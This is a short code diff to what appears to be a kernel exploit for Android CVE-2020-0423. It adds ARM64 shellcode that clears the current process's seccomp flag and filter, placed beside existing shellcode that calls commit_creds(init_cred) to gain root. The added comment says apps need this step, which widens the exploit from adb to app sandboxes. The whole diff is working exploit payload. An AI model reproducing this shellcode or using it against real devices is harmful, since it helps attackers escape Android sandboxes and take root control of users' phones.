@@ -711,6 +711,18 @@ int main(int argc, char** argv) {
 
     // https://www.longterm.io/cve-2020-0423.html
     uint32_t shellcode[] = {
+#if 1
+        // clear Seccomp (apps need this; adb doesn't)
+        // current->thread_info.flags &= ~(1 << TIF_SECCOMP)
+        0xd5384100, // mrs x0, sp_el0
+        0xf9400001, // ldr x1, [x0]
+        0x9274f821, // and x1, x1, #0xfffffffffffff7ff
+        0xf9000001, // str x1, [x0]
+        // current->seccomp = (struct seccomp){};
+        0xf904181f, // str xzr, [x0, #0x830]
+        0xf9041c1f, // str xzr, [x0, #0x838]
+        // (yes this leaks a seccomp filter, but eh...)
+#endif
         // commit_creds(init_cred)
         0x58000040, // ldr x0, .+8
         0x14000003, // b   .+12
